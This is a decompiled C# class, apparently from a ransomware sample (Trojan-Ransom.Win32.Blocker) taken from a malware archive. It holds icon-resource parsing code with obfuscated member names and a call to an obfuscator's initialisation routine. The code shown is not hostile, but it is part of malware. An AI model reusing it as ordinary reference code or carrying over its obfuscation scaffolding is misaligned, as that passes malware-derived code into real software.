// Decompiled with JetBrains decompiler
// Type: fLaSh.Dissembler.IconFileIcon
// Assembly: Pass, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B2D05123-D1EE-4E11-B4EC-79932D637F25
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.ajjm-b001e2657b2764cdbd2d9790e4eb90ffd0dc35ed5746bdc109cf01610ec1d1c3.exe

using In2aXkPRwyNprNdGJT;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace fLaSh.Dissembler
{
  public class IconFileIcon
  {
    private Kernel32.FILEGRPICONDIRENTRY Tsbtq9LCS;
    private IconImage ctUGcm7PW;

    public Kernel32.FILEGRPICONDIRENTRY Header
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Tsbtq9LCS;
    }

    public IconImage Image
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.ctUGcm7PW;
      [MethodImpl(MethodImplOptions.NoInlining)] set => this.ctUGcm7PW = value;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public IconFileIcon()
    {
      rbdjPoeaA1BgLlupgC.XYjXOJ9ztPdU4();
      this.ctUGcm7PW = new IconImage();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    public byte Width
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Tsbtq9LCS.bWidth;
    }

    public byte Height
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Tsbtq9LCS.bHeight;
    }

    public uint ImageSize
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.Tsbtq9LCS.dwImageSize;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public IntPtr Read(IntPtr lpData, IntPtr lpAllData)
    {
      this.Tsbtq9LCS = (Kernel32.FILEGRPICONDIRENTRY) Marshal.PtrToStructure(lpData, typeof (Kernel32.FILEGRPICONDIRENTRY));
      this.ctUGcm7PW.Read(new IntPtr((long) lpAllData.ToInt32() + (long) this.Tsbtq9LCS.dwFileOffset), this.Tsbtq9LCS.dwImageSize);
      return new IntPtr(lpData.ToInt32() + Marshal.SizeOf((object) this.Tsbtq9LCS));
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override string ToString() => string.Format("{0}x{1}", (object) this.Width, (object) this.Height);

    [MethodImpl(MethodImplOptions.NoInlining)]
    public IconResource ConvertToIconResource(ushort id) => new IconResource()
    {
      Header = new Kernel32.GRPICONDIRENTRY()
      {
        bColors = this.Tsbtq9LCS.bColors,
        bHeight = this.Tsbtq9LCS.bHeight,
        bReserved = this.Tsbtq9LCS.bReserved,
        bWidth = this.Tsbtq9LCS.bWidth,
        dwImageSize = this.Tsbtq9LCS.dwImageSize,
        wBitsPerPixel = this.Tsbtq9LCS.wBitsPerPixel,
        wPlanes = this.Tsbtq9LCS.wPlanes,
        nID = id
      },
      Image = this.ctUGcm7PW
    };
  }
}
